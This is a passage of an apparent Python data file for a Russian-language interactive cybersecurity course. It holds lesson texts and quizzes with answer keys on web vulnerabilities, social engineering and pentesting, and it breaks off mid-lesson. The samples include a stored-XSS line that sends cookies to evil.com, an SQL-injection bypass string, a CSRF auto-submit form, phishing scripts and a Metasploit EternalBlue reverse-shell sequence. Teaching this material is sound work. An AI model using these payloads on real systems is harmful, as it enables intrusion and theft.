                    {"type": "info", "title": "Топ-10 уязвимостей веб-приложений", "markdown": "## OWASP Top 10 (2021)\n\n**OWASP** — Open Web Application Security Project.\n\n### Топ-10 уязвимостей:\n\n| # | Уязвимость | Описание |\n|---|-----------|----------|\n| 1 | Broken Access Control | Нарушение контроля доступа |\n| 2 | Cryptographic Failures | Ошибки криптографии |\n| 3 | Injection | Внедрение кода (SQL, XSS) |\n| 4 | Insecure Design | Небезопасная архитектура |\n| 5 | Security Misconfiguration | Неправильная конфигурация |\n| 6 | Vulnerable Components | Уязвимые компоненты |\n| 7 | Auth Failures | Ошибки аутентификации |\n| 8 | Data Integrity Failures | Нарушение целостности данных |\n| 9 | Logging Failures | Недостаточное логирование |\n| 10 | SSRF | Server-Side Request Forgery |\n\n### Почему это важно:\n- 95% веб-приложений имеют хотя бы одну уязвимость из Top 10\n- OWASP обновляет список каждые 3-4 года\n- Стандарт для аудитов безопасности\n\n### Ресурсы для практики:\n- OWASP WebGoat\n- DVWA (Damn Vulnerable Web Application)\n- HackTheBox, TryHackMe"},
                    {"type": "quiz", "question": "Какая уязвимость занимает первое место в OWASP Top 10 (2021)?", "options": [{"id": "a", "text": "SQL Injection", "correct": False}, {"id": "b", "text": "Broken Access Control", "correct": True}, {"id": "c", "text": "XSS", "correct": False}, {"id": "d", "text": "CSRF", "correct": False}]},
                    {"type": "matching", "pairs": [{"left": "Injection", "right": "Внедрение вредоносного кода"}, {"left": "SSRF", "right": "Подделка запросов от сервера"}, {"left": "Broken Access Control", "right": "Нарушение контроля доступа"}, {"left": "Security Misconfiguration", "right": "Неправильная настройка безопасности"}]},
                    {"type": "flashcards", "cards": [{"front": "OWASP", "back": "Open Web Application Security Project — организация, публикующая стандарты безопасности"}, {"front": "Broken Access Control", "back": "Уязвимость #1: пользователи могут делать то, на что не имеют прав"}, {"front": "SSRF", "back": "Server-Side Request Forgery — атака, заставляющая сервер делать запросы к внутренним ресурсам"}, {"front": "DVWA", "back": "Damn Vulnerable Web Application — среда для практики взлома"}]},
                ],
            },
            {
                "t": "XSS — межсайтовый скриптинг",
                "xp": 35,
                "steps": [
                    {"type": "info", "title": "XSS-атаки и защита", "markdown": "## XSS (Cross-Site Scripting)\n\nXSS — внедрение вредоносного JavaScript-кода в веб-страницу.\n\n### Типы XSS:\n\n#### Reflected (отражённый):\nВредоносный код в URL → сервер возвращает его в ответе.\n```\nhttps://site.com/search?q=<script>alert('XSS')</script>\n```\n\n#### Stored (хранимый):\nКод сохраняется в БД (комментарий, профиль).\n```html\n<!-- Комментарий с XSS -->\n<script>document.location='http://evil.com/steal?c='+document.cookie</script>\n```\n\n#### DOM-based:\nКод исполняется на стороне клиента через DOM.\n```javascript\n// Уязвимый код\ndocument.getElementById('output').innerHTML = location.hash;\n// URL: site.com#<img src=x onerror=alert('XSS')>\n```\n\n### Защита:\n```javascript\n// 1. Экранирование вывода\nfunction escapeHtml(text) {\n  return text.replace(/[&<>\"']/g, m => ({\n    '&':'&amp;','<':'&lt;','>':'&gt;','\"':'&quot;',\"'\":'&#39;'\n  }[m]));\n}\n\n// 2. Content Security Policy (заголовок)\n// Content-Security-Policy: script-src 'self'\n\n// 3. HttpOnly cookies (JS не имеет доступа)\n// Set-Cookie: session=abc; HttpOnly; Secure\n```"},
                    {"type": "category-sort", "categories": [{"name": "Reflected XSS", "items": ["Код в URL", "Не сохраняется на сервере"]}, {"name": "Stored XSS", "items": ["Код в базе данных", "Влияет на всех пользователей"]}, {"name": "DOM-based XSS", "items": ["Исполнение на клиенте", "Манипуляция через DOM"]}]},
                    {"type": "multi-select", "question": "Какие методы защищают от XSS?", "options": [{"id": "a", "text": "Экранирование вывода", "correct": True}, {"id": "b", "text": "Content Security Policy", "correct": True}, {"id": "c", "text": "HttpOnly cookies", "correct": True}, {"id": "d", "text": "Увеличение RAM сервера", "correct": False}]},
                    {"type": "type-answer", "question": "Какой HTTP-заголовок ограничивает источники скриптов на странице?", "acceptedAnswers": ["Content-Security-Policy", "CSP"]},
                    {"type": "true-false", "statement": "Stored XSS опаснее Reflected XSS, потому что влияет на всех пользователей.", "correct": True},
                ],
            },
            {
                "t": "SQL Injection",
                "xp": 35,
                "steps": [
                    {"type": "info", "title": "SQL-инъекции и защита", "markdown": "## SQL Injection\n\nSQL Injection — внедрение вредоносного SQL-кода через пользовательский ввод.\n\n### Пример уязвимого кода:\n```python\n# УЯЗВИМО ❌\nquery = f\"SELECT * FROM users WHERE username='{username}' AND password='{password}'\"\n\n# Ввод: username = admin' OR '1'='1' --\n# Результат:\n# SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password=''\n# → Возвращает все записи!\n```\n\n### Типы SQL Injection:\n- **Union-based** — UNION SELECT для извлечения данных\n- **Blind (boolean)** — ответ да/нет по поведению\n- **Time-based** — задержки (SLEEP) для извлечения данных\n- **Error-based** — извлечение через сообщения об ошибках\n\n### Защита:\n```python\n# 1. Параметризованные запросы ✓\ncursor.execute(\n    \"SELECT * FROM users WHERE username=%s AND password=%s\",\n    (username, password)\n)\n\n# 2. ORM (SQLAlchemy) ✓\nuser = session.query(User).filter_by(username=username).first()\n\n# 3. Валидация ввода\n# 4. Принцип наименьших привилегий для БД\n# 5. WAF (Web Application Firewall)\n```"},
                    {"type": "code-puzzle", "instructions": "Составьте безопасный параметризованный SQL-запрос:", "correctOrder": ["cursor.execute(", "    \"SELECT * FROM users WHERE username=%s\",", "    (username,)", ")"]},
                    {"type": "quiz", "question": "Какой метод лучше всего защищает от SQL Injection?", "options": [{"id": "a", "text": "Фильтрация кавычек", "correct": False}, {"id": "b", "text": "Параметризованные запросы", "correct": True}, {"id": "c", "text": "Увеличение длины пароля", "correct": False}, {"id": "d", "text": "Использование HTTPS", "correct": False}]},
                    {"type": "true-false", "statement": "Использование ORM (например SQLAlchemy) полностью защищает от SQL Injection.", "correct": False},
                    {"type": "fill-blank", "sentence": "Атака, при которой злоумышленник использует SLEEP() для извлечения данных побитно, называется ___ SQL Injection.", "answer": "time-based"},
                ],
            },
            {
                "t": "CSRF — подделка межсайтовых запросов",
                "xp": 30,
                "steps": [
                    {"type": "info", "title": "CSRF-атаки и защита", "markdown": "## CSRF (Cross-Site Request Forgery)\n\nCSRF — атака, при которой злоумышленник заставляет браузер жертвы выполнить нежелательный запрос.\n\n### Как работает:\n```\n1. Жертва авторизована на bank.com\n2. Жертва заходит на evil.com\n3. evil.com содержит:\n   <img src=\"https://bank.com/transfer?to=hacker&amount=10000\">\n4. Браузер отправляет запрос с cookies жертвы\n5. Банк выполняет перевод!\n```\n\n### Более сложный пример:\n```html\n<!-- На evil.com -->\n<form action=\"https://bank.com/transfer\" method=\"POST\" id=\"csrf\">\n  <input type=\"hidden\" name=\"to\" value=\"hacker\">\n  <input type=\"hidden\" name=\"amount\" value=\"10000\">\n</form>\n<script>document.getElementById('csrf').submit();</script>\n```\n\n### Защита:\n1. **CSRF-токены** — уникальный токен в каждой форме\n2. **SameSite cookies** — `Set-Cookie: session=abc; SameSite=Strict`\n3. **Проверка заголовка Referer/Origin**\n4. **Двойная отправка cookie**\n\n### CSRF vs XSS:\n- XSS = внедрение кода в сайт\n- CSRF = обман браузера для выполнения действий"},
                    {"type": "quiz", "question": "Что такое CSRF-токен?", "options": [{"id": "a", "text": "Уникальный токен в форме для проверки подлинности запроса", "correct": True}, {"id": "b", "text": "Тип шифрования", "correct": False}, {"id": "c", "text": "Cookie для аутентификации", "correct": False}, {"id": "d", "text": "JavaScript-библиотека", "correct": False}]},
                    {"type": "drag-order", "items": ["Жертва авторизована на целевом сайте", "Жертва заходит на вредоносную страницу", "Вредоносная страница отправляет запрос от имени жертвы", "Браузер автоматически прикрепляет cookies", "Целевой сайт выполняет запрос"]},
                    {"type": "multi-select", "question": "Какие методы защищают от CSRF?", "options": [{"id": "a", "text": "CSRF-токены", "correct": True}, {"id": "b", "text": "SameSite cookies", "correct": True}, {"id": "c", "text": "Шифрование AES", "correct": False}, {"id": "d", "text": "Проверка заголовка Origin", "correct": True}]},
                ],
            },
            {
                "t": "Безопасная аутентификация",
                "xp": 30,
                "steps": [
                    {"type": "info", "title": "Аутентификация и авторизация", "markdown": "## Безопасная аутентификация\n\n### Аутентификация vs Авторизация:\n- **Аутентификация** — КТО ты? (логин + пароль)\n- **Авторизация** — ЧТО тебе можно? (права доступа)\n\n### Методы аутентификации:\n1. **Пароль** — самый распространённый\n2. **MFA (Multi-Factor Authentication)** — 2+ фактора\n3. **OAuth 2.0 / OpenID Connect** — через Google, GitHub\n4. **JWT (JSON Web Token)** — stateless аутентификация\n5. **Passkeys / WebAuthn** — без пароля\n\n### Факторы аутентификации:\n- **Знание** — пароль, PIN\n- **Владение** — телефон, ключ\n- **Биометрия** — отпечаток, лицо\n\n### Безопасное хранение паролей:\n```python\nimport bcrypt\n\n# Хеширование\npassword = b\"MySecretPassword\"\nhashed = bcrypt.hashpw(password, bcrypt.gensalt())\n\n# Проверка\nif bcrypt.checkpw(password, hashed):\n    print(\"Пароль верный!\")\n```\n\n### Правила паролей:\n- Минимум 12 символов\n- Использование менеджера паролей\n- Уникальный пароль для каждого сервиса\n- MFA везде, где возможно"},
                    {"type": "category-sort", "categories": [{"name": "Аутентификация", "items": ["Логин и пароль", "Отпечаток пальца", "MFA"]}, {"name": "Авторизация", "items": ["Права доступа", "Роли пользователей", "ACL"]}]},
                    {"type": "matching", "pairs": [{"left": "Знание", "right": "Пароль, PIN-код"}, {"left": "Владение", "right": "Телефон, аппаратный ключ"}, {"left": "Биометрия", "right": "Отпечаток, распознавание лица"}, {"left": "JWT", "right": "Stateless токен аутентификации"}]},
                    {"type": "true-false", "statement": "MFA (многофакторная аутентификация) использует только два фактора — пароль и SMS.", "correct": False},
                    {"type": "fill-blank", "sentence": "Для безопасного хранения паролей рекомендуется использовать ___ или Argon2.", "answer": "bcrypt"},
                ],
            },
            {
                "t": "CORS и заголовки безопасности",
                "xp": 25,
                "steps": [
                    {"type": "info", "title": "CORS и HTTP-заголовки безопасности", "markdown": "## CORS (Cross-Origin Resource Sharing)\n\nCORS — механизм, позволяющий ресурсам на одном домене запрашивать ресурсы с другого.\n\n### Same-Origin Policy:\nБраузер блокирует запросы к другим доменам по умолчанию.\n```\nhttps://app.com → https://api.com  ❌ Заблокировано\nhttps://app.com → https://app.com  ✓ Разрешено\n```\n\n### Заголовки CORS:\n```http\nAccess-Control-Allow-Origin: https://app.com\nAccess-Control-Allow-Methods: GET, POST\nAccess-Control-Allow-Headers: Content-Type, Authorization\nAccess-Control-Allow-Credentials: true\n```\n\n### Опасные конфигурации:\n```http\n# НИКОГДА не делайте так с credentials! ❌\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Другие важные заголовки:\n```http\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nX-Content-Type-Options: nosniff\nX-Frame-Options: DENY\nContent-Security-Policy: default-src 'self'\nReferrer-Policy: strict-origin-when-cross-origin\n```"},
                    {"type": "quiz", "question": "Что делает Same-Origin Policy?", "options": [{"id": "a", "text": "Блокирует запросы к другим доменам по умолчанию", "correct": True}, {"id": "b", "text": "Шифрует все запросы", "correct": False}, {"id": "c", "text": "Ускоряет загрузку страницы", "correct": False}, {"id": "d", "text": "Кэширует ресурсы", "correct": False}]},
                    {"type": "matching", "pairs": [{"left": "X-Frame-Options: DENY", "right": "Запрет встраивания страницы в iframe"}, {"left": "HSTS", "right": "Принудительный HTTPS"}, {"left": "X-Content-Type-Options", "right": "Запрет MIME-sniffing"}, {"left": "CSP", "right": "Ограничение загрузки ресурсов"}]},
                    {"type": "true-false", "statement": "Установка Access-Control-Allow-Origin: * вместе с Allow-Credentials: true — безопасная конфигурация.", "correct": False},
                ],
            },
        ],
    },
    # ===== SECTION 5: Социальная инженерия =====
    {
        "title": "Социальная инженерия",
        "pos": 4,
        "lessons": [
            {
                "t": "Фишинг",
                "xp": 25,
                "steps": [
                    {"type": "info", "title": "Фишинг — атака через обман", "markdown": "## Фишинг\n\n**Фишинг** — метод социальной инженерии, при котором злоумышленник маскируется под доверенное лицо для кражи данных.\n\n### Типы фишинга:\n\n#### Email-фишинг:\n- Массовые рассылки от имени банков, сервисов\n- Поддельные ссылки и вложения\n\n#### Spear phishing (целевой):\n- Персонализированные атаки на конкретных людей\n- Используют информацию из соцсетей\n\n#### Whaling:\n- Фишинг на руководство (CEO, CFO)\n- Высокие ставки, тщательная подготовка\n\n#### Smishing & Vishing:\n- **Smishing** — фишинг через SMS\n- **Vishing** — фишинг через голосовые звонки\n\n### Признаки фишинга:\n1. Срочность: «Ваш аккаунт заблокирован!»\n2. Подозрительный домен: `paypa1.com` вместо `paypal.com`\n3. Грамматические ошибки\n4. Запрос личных данных\n5. Подозрительные вложения\n\n### Пример:\n```\nОт: security@bank-support.fake.com\nТема: Срочно! Ваша карта заблокирована!\n\nУважаемый клиент, перейдите по ссылке для\nразблокировки: http://bank-login.evil.com\n```"},
                    {"type": "category-sort", "categories": [{"name": "Email-фишинг", "items": ["Массовая рассылка", "Поддельные письма от банков"]}, {"name": "Spear phishing", "items": ["Персонализированная атака", "Данные из соцсетей"]}, {"name": "Whaling", "items": ["Атака на CEO/CFO", "Высокие ставки"]}]},
                    {"type": "multi-select", "question": "Какие признаки указывают на фишинговое письмо?", "options": [{"id": "a", "text": "Срочность и давление", "correct": True}, {"id": "b", "text": "Подозрительный домен", "correct": True}, {"id": "c", "text": "Письмо от известного контакта с правильным доменом", "correct": False}, {"id": "d", "text": "Запрос личных данных", "correct": True}, {"id": "e", "text": "Грамматические ошибки", "correct": True}]},
                    {"type": "true-false", "statement": "Spear phishing — это массовая рассылка фишинговых писем без персонализации.", "correct": False},
                ],
            },
            {
                "t": "Pretexting и предлоги",
                "xp": 25,
                "steps": [
                    {"type": "info", "title": "Pretexting — создание ложного контекста", "markdown": "## Pretexting\n\n**Pretexting** — создание вымышленного сценария (предлога) для получения информации или доступа.\n\n### Как работает:\nЗлоумышленник создаёт правдоподобную легенду:\n- «Я из IT-отдела, мне нужен ваш пароль для обновления»\n- «Я из службы безопасности, проверяю вашу учётную запись»\n- «Я новый сотрудник, мне нужен доступ к системе»\n\n### Техники:\n1. **Имперсонация** — притворяться кем-то (техподдержка, начальник)\n2. **Tailgating** — проход за сотрудником через закрытую дверь\n3. **Shoulder surfing** — подсматривание пароля через плечо\n4. **Dumpster diving** — поиск данных в мусоре\n\n### Примеры:\n```\nЗвонок: «Здравствуйте, это техподдержка Microsoft.\nМы обнаружили вирус на вашем компьютере.\nПожалуйста, установите TeamViewer и дайте нам доступ.»\n\nEmail: «Я ваш новый руководитель проекта.\nСрочно пришлите мне отчёт с данными клиентов.»\n```\n\n### Защита:\n- Всегда проверяйте личность звонящего\n- Не давайте пароли по телефону или email\n- Используйте процедуры верификации"},
                    {"type": "matching", "pairs": [{"left": "Имперсонация", "right": "Притворяться техподдержкой или начальником"}, {"left": "Tailgating", "right": "Проход за сотрудником через закрытую дверь"}, {"left": "Shoulder surfing", "right": "Подсматривание пароля через плечо"}, {"left": "Dumpster diving", "right": "Поиск конфиденциальных данных в мусоре"}]},
                    {"type": "quiz", "question": "Что такое tailgating?", "options": [{"id": "a", "text": "Проход за сотрудником через закрытую дверь", "correct": True}, {"id": "b", "text": "Фишинг через SMS", "correct": False}, {"id": "c", "text": "Подбор паролей", "correct": False}, {"id": "d", "text": "DDoS-атака", "correct": False}]},
                    {"type": "true-false", "statement": "Dumpster diving — это законный метод сбора информации, который не требует защиты.", "correct": False},
                ],
            },
            {
                "t": "Baiting и приманки",
                "xp": 20,
                "steps": [
                    {"type": "info", "title": "Baiting — атака через приманку", "markdown": "## Baiting\n\n**Baiting** — атака, использующая приманку (физическую или цифровую) для заражения устройства.\n\n### Физический baiting:\n- USB-флешка с malware, оставленная в офисе\n- CD/DVD с надписью «Зарплаты 2025» в парковке\n- Подарочный power bank с вредоносным ПО\n\n### Цифровой baiting:\n- Бесплатное ПО с троянами\n- Торренты с malware\n- Поддельные обновления: «Обновите Flash Player!»\n- Файлы: `salary_report.pdf.exe`\n\n### USB Drop Attack:\n```\n1. Злоумышленник оставляет USB в офисе/парковке\n2. Любопытный сотрудник подключает к ПК\n3. Автоматически запускается malware\n4. Злоумышленник получает доступ к сети\n```\n\n### Защита:\n- Никогда не подключайте неизвестные USB-устройства\n- Отключите автозапуск USB\n- Скачивайте ПО только из официальных источников\n- Обучение сотрудников (awareness)"},
                    {"type": "quiz", "question": "Что такое USB Drop Attack?", "options": [{"id": "a", "text": "Оставление заражённой флешки для подключения жертвой", "correct": True}, {"id": "b", "text": "Атака на USB-порт компьютера", "correct": False}, {"id": "c", "text": "Шифрование данных на флешке", "correct": False}, {"id": "d", "text": "DDoS через USB", "correct": False}]},
                    {"type": "drag-order", "items": ["Злоумышленник оставляет USB-флешку в офисе", "Сотрудник находит и подключает флешку к ПК", "Malware автоматически запускается", "Злоумышленник получает доступ к корпоративной сети"]},
                    {"type": "true-false", "statement": "Автозапуск USB следует отключить для защиты от baiting-атак.", "correct": True},
                ],
            },
            {
                "t": "Защита от социальной инженерии",
                "xp": 25,
                "steps": [
                    {"type": "info", "title": "Методы противодействия SE", "markdown": "## Защита от социальной инженерии\n\n### Технические меры:\n1. **Email-фильтры** — SPF, DKIM, DMARC\n2. **MFA** — даже при утечке пароля аккаунт защищён\n3. **Антифишинг** — проверка URL, sandbox для вложений\n4. **DLP** — Data Loss Prevention, контроль утечек\n5. **Политики паролей** — сложность, ротация\n\n### Организационные меры:\n1. **Политики безопасности** — чёткие правила\n2. **Верификация** — подтверждение личности при запросах\n3. **Принцип наименьших привилегий**\n4. **Классификация данных** — что конфиденциально\n\n### Культура безопасности:\n- Сотрудники не боятся сообщать о подозрительном\n- Регулярные напоминания\n- Поощрение бдительности\n\n### Проверочные вопросы при подозрительном запросе:\n```\n1. Кто запрашивает?\n2. Имеет ли право на эту информацию?\n3. Есть ли подтверждение личности?\n4. Нормально ли это для данного процесса?\n5. Можно ли проверить через другой канал?\n```"},
                    {"type": "multi-select", "question": "Какие технические меры защищают от социальной инженерии?", "options": [{"id": "a", "text": "SPF, DKIM, DMARC", "correct": True}, {"id": "b", "text": "MFA", "correct": True}, {"id": "c", "text": "DLP", "correct": True}, {"id": "d", "text": "Увеличение скорости интернета", "correct": False}]},
                    {"type": "matching", "pairs": [{"left": "SPF", "right": "Проверка отправителя email"}, {"left": "DKIM", "right": "Цифровая подпись email"}, {"left": "DMARC", "right": "Политика обработки неаутентифицированных email"}, {"left": "DLP", "right": "Предотвращение утечки данных"}]},
                    {"type": "flashcards", "cards": [{"front": "SPF", "back": "Sender Policy Framework — проверка, что email отправлен с авторизованного сервера"}, {"front": "DKIM", "back": "DomainKeys Identified Mail — цифровая подпись email для проверки подлинности"}, {"front": "DMARC", "back": "Domain-based Message Authentication — политика для SPF + DKIM"}, {"front": "DLP", "back": "Data Loss Prevention — технология предотвращения утечки данных"}]},
                ],
            },
            {
                "t": "Security Awareness Training",
                "xp": 25,
                "steps": [
                    {"type": "info", "title": "Обучение безопасности для сотрудников", "markdown": "## Security Awareness Training\n\n### Зачем нужно:\n- **95%** инцидентов ИБ связаны с человеческим фактором\n- Обученный сотрудник — первая линия защиты\n- Требование стандартов (ISO 27001, PCI DSS)\n\n### Программа обучения:\n\n#### Базовые темы:\n1. Распознавание фишинга\n2. Безопасность паролей\n3. Физическая безопасность\n4. Безопасный интернет\n5. Работа с конфиденциальными данными\n\n#### Методы обучения:\n- **Симуляции фишинга** — тестовые фишинговые письма\n- **Геймификация** — баллы, соревнования\n- **Микрообучение** — короткие модули по 5-10 минут\n- **Тестирование** — проверка знаний\n\n### Метрики эффективности:\n```\n- Click rate (% кликов на фишинг): цель < 5%\n- Report rate (% сообщений о фишинге): цель > 70%\n- Time to report: цель < 10 минут\n- Повторные нарушители: цель < 2%\n```\n\n### Лучшие практики:\n- Обучение при найме + ежегодно\n- Тестирование каждый квартал\n- Поддержка руководства\n- Позитивная мотивация, а не наказание"},
                    {"type": "quiz", "question": "Какой процент инцидентов ИБ связан с человеческим фактором?", "options": [{"id": "a", "text": "50%", "correct": False}, {"id": "b", "text": "75%", "correct": False}, {"id": "c", "text": "95%", "correct": True}, {"id": "d", "text": "30%", "correct": False}]},
                    {"type": "drag-order", "items": ["Обучение при найме (onboarding)", "Базовый тренинг по фишингу и паролям", "Первая симуляция фишинга", "Анализ результатов и дополнительное обучение", "Ежеквартальное тестирование"]},
                    {"type": "fill-blank", "sentence": "Целевой показатель click rate при симуляции фишинга — менее ___%, чем ниже, тем лучше.", "answer": "5"},
                ],
            },
        ],
    },
    # ===== SECTION 6: Пентестинг =====
    {
        "title": "Пентестинг",
        "pos": 5,
        "lessons": [
            {
                "t": "Методология пентестинга",
                "xp": 25,
                "steps": [
                    {"type": "info", "title": "Этапы пентеста", "markdown": "## Методология пентестинга\n\n**Пентест (Penetration Testing)** — авторизованная имитация кибератаки для поиска уязвимостей.\n\n### Фазы пентеста:\n\n```\n1. Планирование → 2. Разведка → 3. Сканирование →\n4. Эксплуатация → 5. Пост-эксплуатация → 6. Отчёт\n```\n\n### Типы пентестов:\n- **Black Box** — тестировщик ничего не знает о системе\n- **White Box** — полный доступ к исходному коду и документации\n- **Grey Box** — частичная информация (учётные данные обычного пользователя)\n\n### Стандарты:\n- **OWASP Testing Guide** — для веб-приложений\n- **PTES** — Penetration Testing Execution Standard\n- **NIST SP 800-115** — технический гайд по оценке ИБ\n\n### Правовые аспекты:\n- **Обязательно** — письменное разрешение (Scope / Rules of Engagement)\n- Чётко определённые границы тестирования\n- Пентест без разрешения = уголовное преступление"},
                    {"type": "drag-order", "items": ["Планирование и определение scope", "Разведка (reconnaissance)", "Сканирование и анализ уязвимостей", "Эксплуатация уязвимостей", "Пост-эксплуатация и закрепление", "Составление отчёта"]},
                    {"type": "category-sort", "categories": [{"name": "Black Box", "items": ["Нет информации о системе", "Имитация реальной атаки"]}, {"name": "White Box", "items": ["Доступ к исходному коду", "Полная документация"]}, {"name": "Grey Box", "items": ["Частичная информация", "Учётные данные обычного пользователя"]}]},
                    {"type": "true-false", "statement": "Пентест можно проводить без письменного разрешения, если цели благие.", "correct": False},
                ],
            },
            {
                "t": "Разведка (Reconnaissance)",
                "xp": 30,
                "steps": [
                    {"type": "info", "title": "Пассивная и активная разведка", "markdown": "## Разведка (Reconnaissance)\n\n### Пассивная разведка:\nСбор информации БЕЗ взаимодействия с целью.\n\n**Инструменты и методы:**\n- **WHOIS** — информация о домене и владельце\n- **DNS lookup** — записи DNS\n- **Shodan** — поиск устройств в интернете\n- **Google Dorks** — продвинутый поиск Google\n- **theHarvester** — сбор email, доменов\n- **Social media** — OSINT через соцсети\n\n### Google Dorks:\n```\nsite:target.com filetype:pdf\nsite:target.com inurl:admin\n\"password\" site:target.com filetype:xlsx\nintitle:\"index of\" site:target.com\n```\n\n### Активная разведка:\nПрямое взаимодействие с целью.\n\n**Инструменты:**\n- **nmap** — сканирование портов\n- **dig / nslookup** — DNS-запросы\n- **traceroute** — маршрут до хоста\n\n```bash\n# Пример: DNS-разведка\ndig target.com ANY\nwhois target.com\n\n# theHarvester\ntheHarvester -d target.com -b google,linkedin\n```\n\n### OSINT Framework:\nНабор бесплатных инструментов для сбора открытых данных."},
                    {"type": "category-sort", "categories": [{"name": "Пассивная разведка", "items": ["WHOIS", "Google Dorks", "Shodan"]}, {"name": "Активная разведка", "items": ["nmap", "traceroute", "dig"]}]},
                    {"type": "quiz", "question": "Что такое Google Dorks?", "options": [{"id": "a", "text": "Продвинутые поисковые запросы Google для сбора информации", "correct": True}, {"id": "b", "text": "Вирус от Google", "correct": False}, {"id": "c", "text": "Расширение для Chrome", "correct": False}, {"id": "d", "text": "VPN-сервис", "correct": False}]},
                    {"type": "type-answer", "question": "Какой онлайн-сервис позволяет искать устройства, подключённые к интернету?", "acceptedAnswers": ["Shodan", "shodan", "shodan.io"]},
                    {"type": "fill-blank", "sentence": "___ — это процесс сбора информации из открытых источников.", "answer": "OSINT"},
                ],
            },
            {
                "t": "Сканирование и анализ уязвимостей",
                "xp": 35,
                "steps": [
                    {"type": "info", "title": "Nmap и сканеры уязвимостей", "markdown": "## Сканирование\n\n### Nmap — Network Mapper:\nСамый популярный сканер портов.\n\n```bash\n# Базовое сканирование\nnmap 192.168.1.1\n\n# Сканирование диапазона\nnmap 192.168.1.0/24\n\n# Определение сервисов и версий\nnmap -sV 192.168.1.1\n\n# Определение ОС\nnmap -O 192.168.1.1\n\n# Скрытое SYN-сканирование\nnmap -sS 192.168.1.1\n\n# Скрипты NSE (Nmap Scripting Engine)\nnmap --script vuln 192.168.1.1\n\n# Агрессивное сканирование (всё сразу)\nnmap -A 192.168.1.1\n```\n\n### Статусы портов:\n| Статус | Значение |\n|--------|----------|\n| open | Порт открыт, сервис слушает |\n| closed | Порт закрыт, ничего не слушает |\n| filtered | Файрвол блокирует |\n\n### Сканеры уязвимостей:\n- **Nessus** — коммерческий сканер\n- **OpenVAS** — open-source альтернатива\n- **Nikto** — сканер веб-серверов\n- **Nuclei** — быстрый сканер с шаблонами"},
                    {"type": "code-puzzle", "instructions": "Составьте команду nmap для определения сервисов и версий:", "correctOrder": ["nmap", "-sV", "192.168.1.1"]},
                    {"type": "matching", "pairs": [{"left": "open", "right": "Порт открыт, сервис слушает"}, {"left": "closed", "right": "Порт закрыт"}, {"left": "filtered", "right": "Файрвол блокирует"}, {"left": "-sS", "right": "Скрытое SYN-сканирование"}]},
                    {"type": "quiz", "question": "Какой флаг nmap определяет версии сервисов?", "options": [{"id": "a", "text": "-sS", "correct": False}, {"id": "b", "text": "-sV", "correct": True}, {"id": "c", "text": "-O", "correct": False}, {"id": "d", "text": "-p", "correct": False}]},
                    {"type": "multi-select", "question": "Какие из этих инструментов являются сканерами уязвимостей?", "options": [{"id": "a", "text": "Nessus", "correct": True}, {"id": "b", "text": "OpenVAS", "correct": True}, {"id": "c", "text": "Photoshop", "correct": False}, {"id": "d", "text": "Nikto", "correct": True}, {"id": "e", "text": "VS Code", "correct": False}]},
                ],
            },
            {
                "t": "Эксплуатация уязвимостей",
                "xp": 35,
                "steps": [
                    {"type": "info", "title": "Эксплуатация и Metasploit", "markdown": "## Эксплуатация\n\nЭксплуатация — использование найденных уязвимостей для получения доступа.\n\n### Metasploit Framework:\nСамый популярный фреймворк для эксплуатации.\n\n```bash\n# Запуск\nmsfconsole\n\n# Поиск эксплоитов\nmsf> search eternalblue\n\n# Выбор эксплоита\nmsf> use exploit/windows/smb/ms17_010_eternalblue\n\n# Настройка\nmsf> set RHOSTS 192.168.1.100\nmsf> set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf> set LHOST 192.168.1.50\n\n# Запуск\nmsf> exploit\n```\n\n### Типы эксплуатации:\n- **Remote Code Execution (RCE)** — удалённое выполнение кода\n- **Privilege Escalation** — повышение привилегий\n- **Buffer Overflow** — переполнение буфера\n- **Password Cracking** — подбор паролей\n\n### Инструменты:\n- **Metasploit** — фреймворк эксплуатации\n- **Hydra** — brute force логинов\n- **John the Ripper** — взлом хешей паролей\n- **Hashcat** — GPU-ускоренный взлом хешей\n\n### Этика:\nВсегда работайте **только в рамках разрешённого scope!**"},
                    {"type": "drag-order", "items": ["Запустить msfconsole", "Найти подходящий эксплоит (search)", "Выбрать эксплоит (use)", "Настроить параметры (set RHOSTS, PAYLOAD)", "Запустить эксплуатацию (exploit)"]},
                    {"type": "matching", "pairs": [{"left": "Metasploit", "right": "Фреймворк эксплуатации уязвимостей"}, {"left": "Hydra", "right": "Brute force логинов и паролей"}, {"left": "John the Ripper", "right": "Взлом хешей паролей"}, {"left": "Hashcat", "right": "GPU-ускоренный взлом хешей"}]},
                    {"type": "quiz", "question": "Что такое Privilege Escalation?", "options": [{"id": "a", "text": "Повышение привилегий в системе", "correct": True}, {"id": "b", "text": "Удалённое выполнение кода", "correct": False}, {"id": "c", "text": "Переполнение буфера", "correct": False}, {"id": "d", "text": "DDoS-атака", "correct": False}]},
                ],
            },
            {
                "t": "Отчёты о пентесте",
                "xp": 25,
                "steps": [
                    {"type": "info", "title": "Как писать отчёт о пентесте", "markdown": "## Отчёт о пентесте\n\nОтчёт — самая важная часть пентеста. Без хорошего отчёта работа бесполезна.\n\n### Структура отчёта:\n\n#### 1. Executive Summary (для руководства):\n- Общая оценка безопасности\n- Критические находки\n- Рекомендации (без техдеталей)\n\n#### 2. Методология:\n- Scope и ограничения\n- Используемые инструменты\n- Временные рамки\n\n#### 3. Находки (для технической команды):\nДля каждой уязвимости:\n```\n- Название уязвимости\n- Severity: Critical / High / Medium / Low / Info\n- CVSS Score: 0.0 - 10.0\n- Описание: что найдено\n- Доказательство: скриншоты, логи\n- Влияние: что может сделать атакующий\n- Рекомендации: как исправить\n- Ссылки: CVE, CWE\n```\n\n### CVSS (Common Vulnerability Scoring System):\n| Оценка | Severity |\n|--------|----------|\n| 0.0 | None |\n| 0.1–3.9 | Low |\n| 4.0–6.9 | Medium |\n| 7.0–8.9 | High |\n| 9.0–10.0 | Critical |"},
                    {"type": "matching", "pairs": [{"left": "0.1–3.9", "right": "Low severity"}, {"left": "4.0–6.9", "right": "Medium severity"}, {"left": "7.0–8.9", "right": "High severity"}, {"left": "9.0–10.0", "right": "Critical severity"}]},
                    {"type": "drag-order", "items": ["Executive Summary (для руководства)", "Описание методологии и scope", "Детальные находки с CVSS-оценками", "Доказательства (скриншоты, логи)", "Рекомендации по устранению"]},
                    {"type": "fill-blank", "sentence": "___ — стандартная система оценки критичности уязвимостей по шкале от 0 до 10.", "answer": "CVSS"},
                ],
            },
            {
                "t": "Инструменты пентестера",
                "xp": 30,
                "steps": [
